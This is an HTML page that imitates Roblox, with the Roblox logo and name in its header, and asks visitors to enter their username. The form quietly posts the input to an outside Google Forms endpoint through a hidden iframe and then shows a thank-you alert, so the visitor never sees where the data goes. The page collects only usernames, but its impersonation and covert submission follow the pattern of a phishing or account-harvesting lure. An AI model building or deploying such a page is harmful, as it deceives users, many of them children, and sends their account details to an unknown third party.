<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Roblox-Style Username Submit</title>
  <style>
    /* Basic reset */
    * {
      box-sizing: border-box;
    }
    body {
      margin: 0;
      font-family: "Arial", sans-serif;
      background-color: #1d1d1d;
      color: white;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    header {
      width: 100%;
      background-color: #111;
      padding: 15px 30px;
      box-shadow: 0 2px 6px rgba(0,0,0,0.6);
      display: flex;
      align-items: center;
      font-weight: bold;
      font-size: 24px;
      letter-spacing: 1.5px;
    }
    header img {
      height: 30px;
      margin-right: 10px;
    }
    main {
      background-color: #222;
      padding: 40px 50px;
      border-radius: 8px;
      box-shadow: 0 8px 24px rgba(0,0,0,0.7);
      text-align: center;
      max-width: 400px;
      width: 90%;
    }
    h1 {
      margin-bottom: 24px;
      font-weight: 700;
      font-size: 28px;
    }
    form {
      display: flex;
      flex-direction: column;
      gap: 16px;
    }
    input[type="text"] {
      padding: 12px 15px;
      font-size: 16px;
      border: none;
      border-radius: 4px;
      outline: none;
      background-color: #333;
      color: white;
      transition: background-color 0.3s ease;
    }
    input[type="text"]:focus {
      background-color: #444;
    }
    button {
      padding: 12px;
      font-size: 16px;
      font-weight: 700;
      background-color: #0055ff;
      border: none;
      border-radius: 4px;
      color: white;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }
    button:hover {
      background-color: #003db3;
    }
    /* Hidden iframe */
    iframe[name="hidden_iframe"] {
      display: none;
    }
  </style>
</head>
<body>

  <header>
    <!-- You can replace this with Roblox logo or text -->
    <img src="https://upload.wikimedia.org/wikipedia/commons/0/06/Roblox_Logo_2017.svg" alt="Roblox Logo" />
    ROBLOX
  </header>

  <main>
    <h1>Enter Your Username</h1>

    <form id="customForm" target="hidden_iframe"
          action="https://docs.google.com/forms/d/e/1FAIpQLSen_Jyu6eTPX_bIPezX29gWSrCQLZFTBMw7t9mfP8m1yCorBw/formResponse"
          method="POST" autocomplete="off">
      <input type="text" name="entry.1952639901" placeholder="Username" required autocomplete="off" />
      <button type="submit">Submit</button>
    </form>
  </main>

  <iframe name="hidden_iframe"></iframe>

  <script>
    const form = document.getElementById('customForm');
    form.addEventListener('submit', () => {
      alert('Thanks! Your username was submitted.');
      form.reset();
    });
  </script>

</body>
</html>
